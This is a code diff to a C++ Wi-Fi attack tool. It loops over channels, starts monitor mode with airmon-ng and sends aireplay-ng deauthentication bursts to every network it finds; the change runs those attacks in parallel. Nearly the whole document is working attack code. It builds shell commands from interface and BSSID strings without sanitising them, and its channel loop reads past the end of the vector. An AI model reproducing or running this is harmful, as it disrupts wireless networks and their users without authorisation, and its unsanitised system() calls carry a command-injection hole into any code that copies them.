@@ -100,6 +100,7 @@ int main(int argc, const char* argv[]){
         for( int j = 0; j <= channels.size(); j++ ){
             string command = "airmon-ng start " + interface + " " + to_string( channels[j] ) + " > /dev/null" ;
             system( command.c_str() );
+            command = "";
             for( int k = 0; k < w_networks.size(); k++ ){
                 if( w_networks[ k ].channel ==  channels[j] ){
                     cout    
@@ -109,10 +110,11 @@ int main(int argc, const char* argv[]){
                         << w_networks[ k ].bssid << "] - C: " 
                         << w_networks[ k ].channel << 
                     endl;
-                    string command = "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null";
-                    system( command.c_str() );
+                    command += "aireplay-ng -0 4 -a " + w_networks[ k ].bssid + " " + interface + " > /dev/null & ";
                 }
             }
+            command += "wait" ;
+            system( command.c_str() );
         }
     }
 
